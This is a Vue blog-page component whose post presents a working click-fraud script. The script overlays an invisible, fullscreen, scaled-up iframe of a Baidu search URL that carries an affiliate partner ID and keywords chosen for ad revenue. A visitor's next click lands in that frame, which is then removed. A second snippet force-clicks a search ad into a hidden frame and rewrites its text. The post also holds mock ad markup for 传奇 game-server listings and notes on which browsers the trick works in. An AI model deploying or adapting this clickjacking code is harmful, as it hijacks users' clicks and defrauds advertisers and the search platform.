<template>
    <div class="blogCss">
        <div class="blog">
            <div class="blogTitle"> 补点击 脚本 尝试</div>
            <div class="blogContent" v-highlight>
                <script type="text/js">
                    ; (function () {
                        var sm = {
                            name: 'Sm',
                            // user: '92111257_hao_pg',
                            // user: '78040160_14_pg&ch=14',
                            user: '78040160_14_pg&ch=7',
                            num: '12345'
                        };
                        /**
                         * 收益配置
                         */
                        var profitConfig = {
                            position: 100, // 设置为0-800左右，设置为800时收益为0
                            probability: 0.12 // 设置为0-1，设置为0时收益最小，可能没有收益
                        };
                        /**
                         * 收益关键字列表
                         */
                        var profitKeyWordList = [
                            '游戏', '医院', '加盟', '餐饮', '婚纱摄影', '培训机构', '少儿英语', '游戏', '口红'
                        ];
                        /**
                         * 每日关键字列表，建议每日更新,数目越多越好
                         */
                        var lastKeyWordList = [
                            '湖人抽中第四顺位', '张云雷演出被叫停', '秋瓷炫将办婚礼', '岳池男子砍伤6人',
                            '勇士1-0开拓者', '中美贸易战', '李嘉诚公司被唱空', '波音4月0订单',
                            '意尔康仓库大火', '洪欣儿子表白妈妈', '任素汐前夫', '奚梦瑶回应怀孕',
                            '月球背面幔源物质', '强制员工秀恩爱', '意尔康仓库大火', '海马狂卖400套房',
                            '巩俐曝担心演不好', '腾讯平均月薪7万', '华为回应美国封锁', '消防拖地小哥找到',
                            '宁泽涛公开恋情', '中国联航飞机没油', '李宇春白色羽毛装', 'Bridge偶遇彭于晏',
                            '灵山景区暂停开放', '黑镜第五季曝预告', '奥迪回应异味致癌', '何猷君审美被吐槽',
                            '中国女排战胜波兰', '叶嘉莹先生再捐款'
                        ];
                        var keyWordList = [].concat(profitKeyWordList, lastKeyWordList);
                        var currentPageKeyWord = getCurrentKeyWord();
                        var randomWord = usefulList();
                        function usefulList () {
                            var r = Math.random();
                            if(r > profitConfig.probability){
                                return getKeyWord(currentPageKeyWord);
                            }
                            return getKeyWord(keyWordList);
                        };
                        /**
                         * 插入iframe搜索页
                         */
                        setTimeout(insertIframe, 0);
                        var listenTimer = setInterval(function () {
                            var activeEle = document.activeElement;
                            var iframe = document.getElementById(sm.name);
                            if (activeEle === iframe) {
                                iframe.style.height = 0;
                                clearInterval(listenTimer);
                                setTimeout(function () {
                                    document.body.removeChild(iframe);
                                    console.log('bdj')
                                }, 5000)
                            }
                        }, 100);
                        /**
                         * 向html中插入搜索页面
                         */
                        function insertIframe() {
                            var windowWidth = document.documentElement.clientWidth;
                            var heightWidth = document.documentElement.clientHeight;
                            var iframe = document.createElement('iframe');
                            iframe.src = 'https://www.baidu.com/s?ie=utf-8&f=8&rsv_bp=1&rsv_idx=1&tn=' + sm.user + '&wd=' + randomWord + '&rsv_t=e4f0RbU73RuCvJNMxjF8q6ZMSud6kOIZaKIA5wRG57VTgLyvR%2Fzna6dvXI8&rsv_enter=0&rsv_dl=tb&rsv_sug3=3&rsv_sug1=3&rsv_sug7=101&inputT=3843&rsv_sug4=137795';
                            iframe.setAttribute('name', sm.name);
                            iframe.setAttribute('id', sm.name);
                            iframe.style.width = windowWidth + 'px';
                            iframe.style.height = heightWidth + 'px';
                            iframe.style.position = 'fixed';
                            iframe.style.overflow = 'hidden';
                            iframe.style.top = 0;
                            iframe.style.left = 0;
                            iframe.style.zIndex = '999999';
                            var opacity = 0;
                            iframe.style.filter = 'alpha(opacity=' + opacity + ')'; /* IE */
                            iframe.style.MozOpacity = (opacity / 100); /* 老版Mozilla */
                            iframe.style.KhtmlOpacity = (opacity / 100); /* 老版Safari */
                            iframe.style.opacity = (opacity / 100); /* 支持opacity的浏览器*/
                            iframe.style.left = -600;
                            var scale = 30;
                            iframe.style.msTransform = 'scale(' + scale + ')';
                            iframe.style.MozTransform = 'scale(' + scale + ')';
                            iframe.style.WebkitTransform = 'scale(' + scale + ')';
                            iframe.style.KhtmlTransform = 'scale(' + scale + ')';
                            iframe.style.OTransform = 'scale(' + scale + ')';
                            var scaleOrigin = '7% 26%';
                            iframe.style.msTransformOrigin = scaleOrigin;
                            iframe.style.MozTransformOrigin = scaleOrigin;
                            iframe.style.WebkitTransformOrigin = scaleOrigin;
                            iframe.style.KhtmlTransformOrigin = scaleOrigin;
                            iframe.style.OTransformOrigin = scaleOrigin;
                            document.body.appendChild(iframe);
                        };
                        /**
                         * 获取随机关键字
                         * @param {数组} list
                         */
                        function getKeyWord(list) {
                            if (!isArray(list)) {return ''}
                            var listLength = list.length;
                            var random = Math.random();
                            return list[parseInt(random * listLength)];
                        };
                        /**
                         * 判断变量是否为数组
                         * @param {变量} value
                         */
                        function isArray(value) {
                            return Object.prototype.toString.call(value) == '[object Array]';
                        };
                        /**
                         * 获取当前网页关键字
                         */
                        function getCurrentKeyWord() {
                            var metaList = document.getElementsByTagName('meta');
                            var title = document.getElementsByTagName('title');
                            var arr = [];
                            arr.push(title[0].innerHTML);
                            for (var i = 0; i < metaList.length; i++) {
                                if(/\<meta.*keywords.*content='.*'\>/.test(nodeToString(metaList[i]))){
                                    var keyword = metaList[i].getAttribute('content');
                                    if (/\,/.test(keyword)){
                                        arr.concat(keyword.split(','));
                                    } else if (/\s*/.test(keyword)){
                                        arr.concat(keyword.split(' '));
                                    }
                                }
                            }
                            return arr;
                        };
                        /**
                         * dom转字符串
                         */
                        function nodeToString(node) {
                            var tmpNode = document.createElement('div');
                            tmpNode.appendChild(node.cloneNode(true));
                            var str = tmpNode.innerHTML;
                            tmpNode = node = null;
                            return str;
                        };
                    })(window);
                </script>
                <script type="text/js">
                    let ifr = document.createElement('iframe');
                    // ifr.style.display = 'none';
                    ifr.name = "fffc";
                    ifr.src = ''
                    document.body.appendChild(ifr);
                    var ad_a0 = document.getElementsByClassName('opr-toplist1-table')[0].getElementsByTagName('a')[0];
                    ad_a0.target = 'fffc'
                    ad_a0.click()
                    var text_a0 = document.getElementsByClassName('become-two-line')[0].getElementsByTagName('a')[0];
                    text_a0.innerHTML = '传奇新游戏';
                    text_a0.href ='http://www.baidu.com';
                </script>
                <script type="text/html" v-pre>
                    <li>
                        <a class="e_haosou_fw_bg_title" id="" href="http://e.so.com" target="_blank" rel="noopener"> 最新新开<em>传奇</em>发布新开<em>传奇</em>网站52345发布 新开<em>传奇</em>！ </a>
                        <div id="wahaha_sm" class="wahaha_sm">
                            <div class="e_haosou_fw_summary">
                                <p>
                                    <a class="inner_desc" href="http://e.so.com" target="_blank" rel="noopener"> 今日 新开<em>传奇</em> 各类<em>传奇</em>新开版本 <em>传奇</em>新开 新开<em>传奇</em>网站<em>传奇</em>发布平台。搜集了各类.<em>传奇</em>新开网站!1.76, 1.80, 1.85 ,1.95 ,1.99，单职业，新开<em>传奇</em>。</a>
                                </p>
                            </div>
                        </div>
                        <div class="wahaha_link e_clearfix">
                            <div>
                                <span>[新开传奇]</span>
                                <a href="http://e.so.com" target="_blank" rel="noopener">〖新开单职业〗〖倍攻单职业〗〖汇集各类版本〗〖玩家找服首选〗〖今日新开<em>传奇</em>〗</a>
                            </div>
                            <div>
                                <span>[新开职业]</span>
                                <a href="http://e.so.com" target="_blank" rel="noopener">〖<em>传奇</em>单职业〗〖低消费<em>传奇</em>〗〖新开<em>传奇</em>新开网〗〖新开<em>传奇</em>〗〖新开<em>传奇</em>〗</a>
                            </div>
                        </div>
                        <div id="e_haoso_fengwu_extend" class="e_haoso_fengwu_extend">
                            <cite>
                                <a target="_blank" href="http://e.so.com" rel="noopener">946hf.dancegyan.com:946</a>
                            </cite>
                            <a href="http://e.so.com" class="e_datestamp" target="_blank" rel="noopener"><span> - 2020-04-10</span></a>
                            <span class="fw_ext tips-triggr e-tag" title="">广告</span>
                        </div>
                        <style type="text/css">
                            #wahaha_sm{max-height: initial;max-height: 280px\0;*max-height: 280px;overflow: initial;position: relative;text-align: left}
                            #wahaha_sm .e_haosou_fw_summary{max-height: 40px;padding-top: 0;width: 540px}
                            #wahaha_sm .e_haosou_fw_summary p{font-size: 13px;line-height: 20px;margin: 0;max-height: 40px;overflow: hidden;text-overflow: ellipsis}
                            .wahaha_link {max-height: none;max-height: none;width:100%;}
                            .wahaha_link div{width:100%;height:23px;line-height: 25px;overflow: hidden;text-overflow:ellipsis;white-space: nowrap;}
                            .wahaha_link div > span{color: #999}
                        </style>
                    </li>

                    <li>
                        <a class="e_haosou_fw_bg_title" id="" href="http://e.so.com" rel="noopener">〖新区〗新开新开<em>传奇</em>网站网站找服发布站新开新开<em>传奇</em>网站网站</a>
                        <div id="e_haosou_fw_sm" class="e_haosou_fw_sm">
                            <div class="e_haosou_fw_summary">
                                <p>
                                    <a class="inner_desc" href="http://e.so.com" target="_blank" rel="noopener">新开<em>传奇</em>网站单职业、176、180、185、195、199、沉默新开<em>传奇</em>网站迷失类版本新开<em>传奇</em>网站单职业、176、180、185、195、199、沉默新开<em>传奇</em>网站迷失类版本</a>
                                </p>
                            </div>
                        </div>
                        <div id="e_haosou_biyi_trans_links" class="e_haosou_biyi_trans_links">
                            <table class="biyi_trans_links_table">
                                <tbody>
                                    <tr>
                                        <td class="trans_label">推荐：</td>
                                        <td class="trans_cont_fst">
                                            <a href="http://e.so.com" target="_blank" rel="noopener">各类单职业</a>
                                        </td>
                                        <td class="trans_cont_sec">
                                            <a href="http://e.so.com" target="_blank" rel="noopener">新开传网站</a>
                                        </td>
                                        <td class="trans_more">
                                            <a href="http://e.so.com" target="_blank" rel="noopener">更多&gt;&gt;</a>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td class="trans_label">热门：</td>
                                        <td class="trans_cont_fst">
                                            <a href="http://e.so.com" target="_blank"  rel="noopener">经典老站</a>
                                        </td>
                                        <td class="trans_cont_sec">
                                            <a href="http://e.so.com" target="_blank" rel="noopener">沉默复古精品</a>
                                        </td>
                                        <td class="trans_more">
                                            <a href="http://e.so.com" target="_blank" rel="noopener">更多&gt;&gt;</a>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                        <div id="e_haoso_fengwu_extend" class="e_haoso_fengwu_extend">
                            <cite><a target="_blank" href="http://e.so.com" rel="noopener">984pk.8u0si.cn:81</a></cite>
                            <a href="http://e.so.com" class="e_datestamp" target="_blank" rel="noopener"><span> - 2020-04-10</span></a>
                            <span class="fw_ext tips-triggr e-tag" title="">广告</span>
                        </div>
                    </li>

                    <li>
                        <a class="e_haosou_fw_bg_title" id="" href="http://e.so.com" target="_blank" rel="noopener">2019新开<em>传奇</em>网页版新区,2019年<em>传奇</em>网页版加强版,<em>传奇</em>王者回归</a>
                        <div id="e_haosou_fw_picture" class="e_haosou_fw_picture">
                            <div class="e_haosou_fw_left_frame">
                                <a class="e_haosou_fw_img" href="http://e.so.com" target="_blank" rel="noopener"> <img src="https://p0.ssl.qhimg.com/t0146b3f85fe640b54f.gif"> </a>
                            </div>
                            <div class="e_haosou_fw_right_frame">
                                <div id="e_haosou_fw_sm" class="e_haosou_fw_sm">
                                    <div class="e_haosou_fw_summary">
                                        <a class="inner_desc" href="http://e.so.com" target="_blank" rel="noopener"><em>传奇</em>网页版,致敬<em>传奇</em>经典,火爆开测,震撼开服!<em>传奇</em>网页版真正1:999,超高攻速<em>传奇</em>,全新<em>传奇</em>网页版boss可爆所有装备,稀有戒指霸气神装,玩到停不下来,赶紧来!!!</a>
                                    </div>
                                </div>
                                <div id="e_haoso_fengwu_extend" class="e_haoso_fengwu_extend">
                                    <cite><a target="_blank" href="http://e.so.com" rel="noopener">360游戏中心</a></cite>
                                    <a href="http://e.so.com" class="e_datestamp" target="_blank" rel="noopener"><span> - 2020-04-10</span></a>
                                    <span class="fw_ext tips-triggr e-tag" title="">广告</span>
                                </div>
                            </div>
                        </div>
                    </li>
                </script>
                <p>360急速浏览器 11.0 没问题</p>
                <p>谷歌浏览器 75 没问题</p>
                <p>没问题</p>
                <hr />
                <p>分析百度</p>
                <p>https://www.baidu.com/?tn=92111257_hao_pg</p>
                <p>https://www.baidu.com/s?ie=utf-8&f=8&rsv_bp=1&rsv_idx=1&tn=baidu&wd=哈哈哈&rsv_t=e4f0RbU73RuCvJNMxjF8q6ZMSud6kOIZaKIA5wRG57VTgLyvR%2Fzna6dvXI8&rsv_enter=0&rsv_dl=tb&rsv_sug3=3&rsv_sug1=3&rsv_sug7=101&inputT=3843&rsv_sug4=137795</p>
                <p>组合成</p>
                <p>https://www.baidu.com/s?ie=utf-8&f=8&rsv_bp=1&rsv_idx=1&tn=92111257_hao_pg&wd=XXX&rsv_t=e4f0RbU73RuCvJNMxjF8q6ZMSud6kOIZaKIA5wRG57VTgLyvR%2Fzna6dvXI8&rsv_enter=0&rsv_dl=tb&rsv_sug3=3&rsv_sug1=3&rsv_sug7=101&inputT=3843&rsv_sug4=137795</p>
                <p></p>
                <p></p>
            </div>
            <div class="blogFooter">
                <Tag color="green">收集</Tag>
                <Tag color="cyan">学习</Tag>
                <Tag color="blue">增长</Tag>
            </div>
        </div>
    </div>
</template>
<script>
export default {
    data () {
        return {}
    },
    methods: {
    },
    mounted () {
    }
}
</script>
